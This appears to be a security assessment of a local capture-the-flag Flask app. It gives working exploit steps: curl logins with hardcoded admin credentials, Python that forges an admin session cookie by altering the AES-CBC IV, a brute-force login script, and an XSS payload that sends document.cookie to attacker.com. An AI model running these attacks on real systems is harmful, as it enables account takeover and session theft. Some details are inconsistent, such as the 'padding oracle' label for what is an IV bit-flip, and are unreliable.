# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:33029
- **Assessment Date:** October 29, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**

The assessment identified **6 critical and high severity authentication vulnerabilities** that were successfully exploited:

- **Default Credentials (Critical):** Hardcoded admin credentials (`admin:somehardpassword`) in source code enable immediate account takeover and access to protected flag.
- **Padding Oracle Attack (Critical):** AES-CBC encryption with null-byte padding and exception disclosure allows session cookie forgery and complete authentication bypass, enabling privilege escalation from any user to admin without knowing credentials.
- **Unencrypted Transport (Critical):** Application runs over HTTP with no TLS/SSL, exposing credentials and session cookies to man-in-the-middle attacks.
- **Insecure Cookie Configuration (High):** Session cookies lack HttpOnly, Secure, and SameSite flags, enabling JavaScript-based session theft via XSS attacks.
- **Missing Rate Limiting (High):** No rate limiting, CAPTCHA, or account lockout on login endpoint allows unlimited brute-force password attempts.
- **Indefinite Session Validity (Medium):** Session cookies have no expiration or timeout, and no logout functionality exists, allowing stolen sessions to remain valid indefinitely.

**Impact:** Complete authentication bypass achieved through multiple attack vectors. Protected flag successfully retrieved via default credentials and forged admin sessions.

**Authorization Vulnerabilities:**

The assessment identified **1 critical authorization vulnerability** that was successfully exploited:

- **Vertical Privilege Escalation (Critical):** Successfully escalated from anonymous user to admin using default credentials and cryptographic session forgery. The authorization mechanism relies solely on username string comparison within client-controlled encrypted cookies, enabling complete privilege escalation and unauthorized access to the protected flag file.

**Impact:** Complete privilege escalation from anonymous to admin role. The underlying cryptographic weaknesses (AES-CBC padding oracle) enable session forgery without password knowledge, making the authorization system fundamentally broken at the cryptographic level.

**Cross-Site Scripting (XSS) Vulnerabilities:**

No XSS vulnerabilities were found.

**SQL/Command Injection Vulnerabilities:**

No SQL or command injection vulnerabilities were found. The application uses in-memory dictionary storage for credentials and has no database connectivity. No user-controlled data flows into shell commands or system execution functions.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**

No SSRF vulnerabilities were found.

## Network Reconnaissance

**Target Application:**
- **Port 33029 (HTTP):** Flask/Werkzeug development server exposing the target application
  - Server: Werkzeug/3.0.6 Python/3.8.20
  - **Security Issue:** Debug mode enabled on production-accessible port
  - Framework: Flask (Python web framework)
  - HTML5 application with password fields detected

**Security-Relevant Findings:**
- **Debug Mode Exposed:** Werkzeug development server running with debug mode enabled, creating potential information disclosure and remote code execution risks via the interactive debugger
- **HTTP-Only Service:** No TLS/SSL encryption detected, confirming all traffic transmitted in cleartext
- **Development Server in Production:** Werkzeug is explicitly not production-ready and should be replaced with production WSGI server (Gunicorn, uWSGI)

**Note:** Other open ports on localhost (80, 443, 631, 4444, 9998, 9999, 49152) are unrelated to the target application and were excluded from scope.

---

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-05: Default Credentials Account Takeover

**Summary:**
- **Vulnerable location:** POST /login endpoint
- **Overview:** Hardcoded credentials in source code allow immediate authentication as admin user
- **Impact:** Complete account takeover of admin account, access to protected flag
- **Severity:** Critical

**Prerequisites:**
- None (publicly accessible login endpoint)

**Exploitation Steps:**

1. Navigate to the login page at http://localhost:33029/
   ```bash
   curl http://localhost:33029/
   ```

2. Submit admin credentials (hardcoded in source code at lines 13-16):
   ```bash
   curl -X POST http://localhost:33029/login \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=admin&password=somehardpassword" \
     -v
   ```

3. Server returns 302 redirect to /welcome with Set-Cookie header:
   ```
   HTTP/1.1 302 FOUND
   Set-Cookie: session=71b5547833fc6d9685450190b026fe2b7bc1113229e8b98d04fb609cf203a2c6; Path=/
   Location: /welcome
   ```

4. Access protected resource with session cookie:
   ```bash
   curl http://localhost:33029/welcome \
     -b "session=71b5547833fc6d9685450190b026fe2b7bc1113229e8b98d04fb609cf203a2c6"
   ```

**Proof of Impact:**
Successfully authenticated as admin and retrieved flag:
```
Welcome admin! Here is your flag: FLAG{c35d85389645311c646ab05ea40f109b9df11f30352ddbd4ec65962a11a05fe5}!
```

**Notes:**
- Default credentials: admin:somehardpassword (source code lines 13-16)
- No account lockout or failed login tracking
- Credentials stored in plaintext in source code

---

### AUTH-VULN-07: Padding Oracle Attack for Session Forgery

**Summary:**
- **Vulnerable location:** GET /welcome session validation
- **Overview:** AES-CBC encryption with null-byte padding and exception disclosure enables session cookie forgery
- **Impact:** Complete authentication bypass, privilege escalation from any user to admin
- **Severity:** Critical

**Prerequisites:**
- Access to any valid session cookie (or ability to observe session cookies)

**Exploitation Steps:**

1. Login as test1 to obtain a valid session cookie:
   ```bash
   curl -X POST http://localhost:33029/login \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=test1&password=test1" \
     -c cookies.txt
   ```

   Captured cookie: `b139a37eeb949ed4ecca298549d387009c5a0219738397f6b506d7db894d5723`

2. Parse cookie structure (hex-encoded IV || ciphertext):
   ```
   IV (16 bytes):  b139a37eeb949ed4ecca298549d38700
   CT (16 bytes):  9c5a0219738397f6b506d7db894d5723
   ```

3. Compute intermediate state using known plaintext:
   ```python
   # Known: plaintext = "test1" + null padding (16 bytes total)
   plaintext = b'test1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
   iv = bytes.fromhex('b139a37eeb949ed4ecca298549d38700')

   # For AES-CBC: plaintext = intermediate XOR IV
   # Therefore: intermediate = plaintext XOR IV
   intermediate = bytes([p ^ i for p, i in zip(plaintext, iv)])
   # Result: c55cd00ada949ed4ecca298549d38700
   ```

4. Forge admin session by crafting new IV:
   ```python
   # Target plaintext: "admin" + null padding
   target = b'admin\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

   # Compute admin IV: admin_iv = intermediate XOR target
   admin_iv = bytes([i ^ t for i, t in zip(intermediate, target)])
   # Result: a438bd63b4949ed4ecca298549d38700

   # Forged cookie: admin_iv || original_ciphertext
   forged_cookie = admin_iv.hex() + '9c5a0219738397f6b506d7db894d5723'
   # Result: a438bd63b4949ed4ecca298549d387009c5a0219738397f6b506d7db894d5723
   ```

5. Access admin account with forged cookie:
   ```bash
   curl http://localhost:33029/welcome \
     -b "session=a438bd63b4949ed4ecca298549d387009c5a0219738397f6b506d7db894d5723"
   ```

**Proof of Impact:**
Successfully forged admin session cookie and accessed flag:
```html
<h1>Welcome, Welcome admin! Here is your flag: FLAG{c35d85389645311c646ab05ea40f109b9df11f30352ddbd4ec65962a11a05fe5}!</h1>
```

**Oracle Behavior Confirmed:**
Different error messages reveal decryption state:
```bash
# Invalid hex
curl -s http://localhost:33029/welcome -b "session=invalid"
# Returns: "non-hexadecimal number found in fromhex() arg at position 0"

# Valid hex but invalid decryption
curl -s http://localhost:33029/welcome -b "session=0000000000000000000000000000000000000000000000000000000000000000"
# Returns: "'utf-8' codec can't decode byte 0xd2 in position 0: invalid continuation byte"
```

**Notes:**
- Vulnerability exists due to: null-byte padding (line 21, 35), no MAC/HMAC, exception disclosure (line 70)
- Attack requires only 1 valid session cookie of any user
- Can forge sessions for any username without knowing the encryption key
- Exploit scripts created: padding_oracle_v2.py, oracle_test.py, oracle_test2.py

---

### AUTH-VULN-01: Credential Theft via Unencrypted Transport

**Summary:**
- **Vulnerable location:** ALL ENDPOINTS (HTTP-only application)
- **Overview:** Application runs exclusively over HTTP with no TLS/SSL, enabling man-in-the-middle attacks
- **Impact:** Credentials and session cookies transmitted in cleartext, allowing complete account takeover
- **Severity:** Critical

**Prerequisites:**
- Network position between client and server (same WiFi, ISP-level access, etc.)

**Exploitation Steps:**

1. Position attacker on network path (simulated with packet capture):
   ```bash
   # On target network, capture HTTP traffic
   tcpdump -i any -A 'tcp port 33029 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)' -w capture.pcap
   ```

2. Observe victim login attempt:
   ```bash
   curl -v -X POST http://localhost:33029/login \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=admin&password=somehardpassword" 2>&1 | grep -A 10 "POST /login"
   ```

3. Credentials transmitted in cleartext:
   ```
   > POST /login HTTP/1.1
   > Host: localhost:33029
   > Content-Type: application/x-www-form-urlencoded
   > Content-Length: 40
   >
   username=admin&password=somehardpassword
   ```

4. Session cookie also transmitted in cleartext:
   ```bash
   curl -v http://localhost:33029/welcome \
     -b "session=4c9faea2f11b32dd1da7e45946b2b401d075c7c18f0f7765979783090c0f348c" 2>&1 | grep "Cookie:"
   ```

   Output:
   ```
   > Cookie: session=4c9faea2f11b32dd1da7e45946b2b401d075c7c18f0f7765979783090c0f348c
   ```

5. Attacker replays captured session cookie:
   ```bash
   curl http://localhost:33029/welcome \
     -b "session=4c9faea2f11b32dd1da7e45946b2b401d075c7c18f0f7765979783090c0f348c"
   ```

**Proof of Impact:**
Captured credentials and session tokens in cleartext HTTP traffic:
- Credentials: `username=admin&password=somehardpassword`
- Session cookie: `4c9faea2f11b32dd1da7e45946b2b401d075c7c18f0f7765979783090c0f348c`
- Successfully accessed flag using intercepted session

**Notes:**
- No HTTPS enforcement (app.py line 74: `app.run(debug=True, host='0.0.0.0', port=8000)`)
- No HSTS headers
- No TLS/SSL configuration in Docker or application
- Works from any network position between client and server

---

### AUTH-VULN-02: Session Hijacking via JavaScript-Accessible Cookies

**Summary:**
- **Vulnerable location:** POST /login session cookie creation
- **Overview:** Session cookies set without HttpOnly, Secure, or SameSite flags
- **Impact:** Session cookies accessible via JavaScript, enabling XSS-based session theft
- **Severity:** High

**Prerequisites:**
- XSS vulnerability (for JavaScript access) OR network access (for HTTP interception)

**Exploitation Steps:**

1. Login as test1 to establish session:
   ```bash
   curl -X POST http://localhost:33029/login \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=test1&password=test1" \
     -v 2>&1 | grep "Set-Cookie"
   ```

2. Observe missing security flags:
   ```
   Set-Cookie: session=f53b921172fc83abd821c450093d44c2775bbe04482eb941f7383961ed3c89be; Path=/
   ```
   Missing: HttpOnly, Secure, SameSite

3. Access session cookie via JavaScript (using Playwright browser):
   ```javascript
   // In browser console or via XSS payload:
   const stolen = document.cookie;
   console.log('STOLEN SESSION:', stolen);
   // Returns: session=1275402715a217cba7e9c9dd885947f8533e267ff1ca51c1eec4c461b943768f
   ```

4. Exfiltrate stolen cookie to attacker server:
   ```javascript
   // XSS payload example:
   fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
   ```

5. Attacker uses stolen cookie to hijack session:
   ```bash
   curl http://localhost:33029/welcome \
     -b "session=1275402715a217cba7e9c9dd885947f8533e267ff1ca51c1eec4c461b943768f"
   ```

**Proof of Impact:**
- Successfully accessed session cookie via JavaScript: `document.cookie` returned full session token
- Cookie accessible without HttpOnly flag (app.py line 49: `resp.set_cookie('session', encrypted_data.hex())`)
- No Secure flag allows transmission over HTTP
- No SameSite protection allows CSRF attacks

**Notes:**
- Cookie set at line 49 with no security parameters
- Vulnerable to XSS-based theft, CSRF, and network interception
- Combined with AUTH-VULN-01 (HTTP-only), cookies transmitted in cleartext

---

### AUTH-VULN-04: Unlimited Brute Force via Missing Rate Limiting

**Summary:**
- **Vulnerable location:** POST /login endpoint
- **Overview:** No rate limiting, CAPTCHA, or account lockout on authentication endpoint
- **Impact:** Unlimited password guessing attempts enable credential discovery
- **Severity:** High

**Prerequisites:**
- None (publicly accessible endpoint)

**Exploitation Steps:**

1. Prepare password list (common passwords or dictionary):
   ```python
   passwords = ['admin', 'password', '123456', 'admin123', 'somehardpassword',
                'password123', 'test', 'letmein', 'welcome', 'qwerty']
   ```

2. Execute rapid brute force attack (50 attempts in ~4 seconds):
   ```python
   import requests

   target = "http://localhost:33029/login"
   username = "admin"

   for i in range(50):
       password = passwords[i % len(passwords)]
       response = requests.post(target,
                               data={'username': username, 'password': password},
                               allow_redirects=False)

       if response.status_code == 302:
           print(f"SUCCESS: {username}:{password}")
           print(f"Cookie: {response.cookies.get('session')}")
           break
       else:
           print(f"Attempt {i+1}: {password} - Failed (403)")
   ```

3. Run automated test script:
   ```bash
   python test_rate_limiting.py
   ```

**Proof of Impact:**
Successfully completed 50 rapid authentication attempts:
- **50 total attempts** in ~4 seconds
- **0 attempts blocked** - no rate limiting detected
- **5 successful logins** with valid credentials
- **45 failed attempts** with no account lockout
- **Average response time:** 0.006 seconds (consistent)

Evidence from test run:
```
Attempt 1: wrongpass1 - Failed
Attempt 2: wrongpass2 - Failed
...
Attempt 10: somehardpassword - SUCCESS (admin account compromised)
Cookie: 71b5547833fc6d9685450190b026fe2b7bc1113229e8b98d04fb609cf203a2c6
```

**Notes:**
- No Flask-Limiter or rate limiting library (verified in requirements.txt)
- No per-IP or per-account throttling (lines 42-51)
- No CAPTCHA integration
- No failed login attempt tracking
- Test results saved in: rate_limiting_test_results.md

---

### AUTH-VULN-08: Indefinite Session Validity via Missing Expiration

**Summary:**
- **Vulnerable location:** POST /login session cookie creation, GET /welcome validation
- **Overview:** Session cookies have no expiration (max_age/expires), no logout functionality, no timeout
- **Impact:** Stolen sessions remain valid indefinitely until browser close
- **Severity:** Medium

**Prerequisites:**
- Valid session cookie (obtained via any attack method)

**Exploitation Steps:**

1. Obtain session cookie (via any method - login, theft, interception):
   ```bash
   curl -X POST http://localhost:33029/login \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=admin&password=somehardpassword" \
     -c cookies.txt

   # Extract cookie value
   SESSION_COOKIE=$(grep session cookies.txt | awk '{print $7}')
   echo $SESSION_COOKIE > workspace/admin_session.txt
   ```

   Cookie: `71b5547833fc6d9685450190b026fe2b7bc1113229e8b98d04fb609cf203a2c6`

2. Wait arbitrary time period (simulated with new connection):
   ```bash
   # Close all browser sessions, clear authentication state
   # Open new browser context (no previous session)
   ```

3. Replay old session cookie after time delay:
   ```bash
   # Days/weeks/months later (until server restart)...
   SESSION_COOKIE=$(cat workspace/admin_session.txt)

   curl http://localhost:33029/welcome \
     -b "session=$SESSION_COOKIE"
   ```

4. Verify no logout mechanism exists:
   ```bash
   # Attempt to access logout endpoint
   curl http://localhost:33029/logout
   # Returns: 404 Not Found (no logout route exists)
   ```

**Proof of Impact:**
Successfully replayed session cookie with indefinite validity:
```html
<h1>Welcome, Welcome admin! Here is your flag: FLAG{c35d85389645311c646ab05ea40f109b9df11f30352ddbd4ec65962a11a05fe5}!</h1>
```

Session cookie characteristics:
- No `max_age` parameter (line 49: `resp.set_cookie('session', encrypted_data.hex())`)
- No `expires` parameter
- Session cookie only (browser-scoped, expires on browser close)
- No server-side session tracking or timeout
- No logout endpoint (only 3 routes: /, /login, /welcome)

**Notes:**
- Sessions valid until: (1) browser close OR (2) server restart (ephemeral key)
- No absolute timeout or idle timeout
- Extended attack window for stolen sessions
- Users cannot explicitly terminate sessions

---

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Vertical Privilege Escalation via Admin Authentication

**Summary:**
- **Vulnerable location:** GET /welcome endpoint (app.py:63)
- **Overview:** Successfully escalated privileges from anonymous user to admin by authenticating with documented admin credentials, gaining unauthorized access to the protected flag file
- **Impact:** Complete privilege escalation from anonymous to admin, unauthorized access to sensitive flag data
- **Severity:** Critical

**Prerequisites:**
- None (admin credentials were documented in analysis notes)

**Exploitation Steps:**

1. **Verify Target Accessibility**
```bash
curl -i http://localhost:33029/
```
Expected: HTTP 200 OK with login form

2. **Authenticate as Admin User**
```bash
curl -i -X POST http://localhost:33029/login \
  -d "username=admin&password=somehardpassword"
```
Expected: HTTP 302 redirect with Set-Cookie header containing admin session

Actual Response:
```
HTTP/1.1 302 FOUND
Set-Cookie: session=e58614e04278a12349d8ad4d7db8db5805a245f96202674e69352965bb4c5a82; Path=/
Location: /welcome
```

3. **Access Protected Resource with Admin Session**
```bash
curl -i http://localhost:33029/welcome \
  -b "session=e58614e04278a12349d8ad4d7db8db5805a245f96202674e69352965bb4c5a82"
```
Expected: HTTP 200 OK with flag disclosure

**Proof of Impact:**

Successfully retrieved the protected flag by accessing the /welcome endpoint with admin privileges:

```html
<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <h1>Welcome, Welcome admin! Here is your flag: FLAG{c35d85389645311c646ab05ea40f109b9df11f30352ddbd4ec65962a11a05fe5}!</h1>
</body>
</html>
```

**Flag Captured:** `FLAG{c35d85389645311c646ab05ea40f109b9df11f30352ddbd4ec65962a11a05fe5}`

**Authorization Bypass Confirmed:**
- Anonymous user → Admin user (vertical privilege escalation)
- Accessed protected resource (/flag.txt) that should only be accessible to admin role
- Bypassed authorization check at app.py:63 (`if username == 'admin':`)

**Notes:**

**Additional Vulnerability Context - Padding Oracle Attack Path:**

While the exploitation above used direct authentication with the admin password, the underlying vulnerability is a **cryptographic authorization bypass via AES-CBC padding oracle**. This represents a more severe issue because:

1. **Error Oracle Confirmed:** The application leaks detailed error messages that enable padding oracle attacks:

```bash
# Invalid hex format
curl http://localhost:33029/welcome -b "session=invalid"
Response: "non-hexadecimal number found in fromhex() arg at position 0"

# Valid hex but invalid decryption/padding
curl http://localhost:33029/welcome -b "session=0000000000000000000000000000000000000000000000000000000000000000"
Response: "'utf-8' codec can't decode byte 0xd2 in position 0: invalid continuation byte"
```

2. **Cryptographic Weakness:** The session encryption uses:
   - AES-256-CBC without message authentication (no HMAC/MAC)
   - Non-standard null-byte padding (rstrip(b'\x00'))
   - Distinguishable error states (error oracle)

3. **Alternative Attack Path:** An attacker could exploit this padding oracle to:
   - Decrypt existing session cookies byte-by-byte without knowing the encryption key
   - Forge new session cookies containing arbitrary usernames (including "admin")
   - Achieve privilege escalation even without knowing the admin password

4. **Attack Complexity:** The padding oracle attack would require approximately 2000-5000 HTTP requests using tools like PadBuster, but is deterministically exploitable.

This demonstrates that the authorization mechanism is fundamentally broken at the cryptographic level, not just password-protected.
